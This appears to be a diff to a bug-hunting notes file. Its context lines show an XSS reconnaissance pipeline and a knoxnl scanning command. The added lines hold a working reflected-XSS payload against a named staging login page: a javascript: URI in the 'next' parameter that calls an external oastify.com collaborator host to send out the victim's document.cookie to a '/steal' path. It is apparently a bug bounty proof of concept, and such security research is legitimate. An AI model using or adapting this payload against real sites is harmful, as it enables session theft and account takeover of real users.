@@ -132,3 +132,9 @@ cat xss.txt |sort -u | grep "=" | egrep -iv ".(css|woff|woff2|txt|js|m4r|m4p|m4b
 Run knoxnl against xss with both GET,POST methods.
 knoxnl -i xss -X BOTH -s -o xssoutput.txt
 ```
+
+```
+https://app.staging.makeswift.com/login?next=javascript%3Afetch(%27https%3A%2F%2Flrg1wp93ejpjd16ko0rfja8zqqwhk88x.oastify.com%2Fsteal%3Fcookie%3D%27%2BencodeURIComponent(document.cookie))
+![image](https://github.com/user-attachments/assets/d9588aa4-44c3-4ae6-ae9c-07731ae84d9d)
+
+```
